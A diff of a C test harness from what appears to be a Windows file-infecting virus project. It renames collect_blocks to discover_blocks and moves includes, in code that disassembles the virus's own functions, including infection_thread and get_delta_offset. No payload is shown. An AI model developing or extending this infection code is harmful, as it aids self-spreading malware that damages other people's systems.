@@ -7,8 +7,9 @@
 #include "code_begin.h"
 #include "code_end.h"
 #include "delta.h"
-#include "disasm/analysis/block.h"
-#include "disasm/analysis/reference.h"
+#include "block/block.h"
+#include "block/discovery.h"
+#include "block/reference.h"
 #include "disasm/disasm.h"
 #include "function_kernel32.h"
 #include "infect.h"
@@ -23,7 +24,7 @@
 int main(int argc, char **argv) {
     const char *function_names[] = {"get_string",
                                     "checksum",
-                                    "collect_blocks",
+                                    "discover_blocks",
                                     "get_delta_offset",
                                     "setup_disasm",
                                     "next_instruction",
@@ -47,7 +48,7 @@ int main(int argc, char **argv) {
                                     NULL};
     const void *function_addresses[] = {(void *)get_string,
                                         (void *)checksum,
-                                        (void *)collect_blocks,
+                                        (void *)discover_blocks,
                                         (void *)get_delta_offset,
                                         (void *)setup_disasm,
                                         (void *)next_instruction,
@@ -81,11 +82,11 @@ int main(int argc, char **argv) {
     memset_local(found_list, false, sizeof(bool) * expected);
 
     void *entrypoints[] = {(void *)spawn_infection_thread,
-                           (void *)infection_thread, (void *)collect_blocks,
+                           (void *)infection_thread, (void *)discover_blocks,
                            NULL};
 
     BlockList *blocks =
-        collect_blocks(entrypoints, (void *)code_begin, (void *)code_end);
+        discover_blocks(entrypoints, (void *)code_begin, (void *)code_end);
 
     if (blocks == NULL) {
         fprintf(stderr, "collect_blocks() returned NULL");
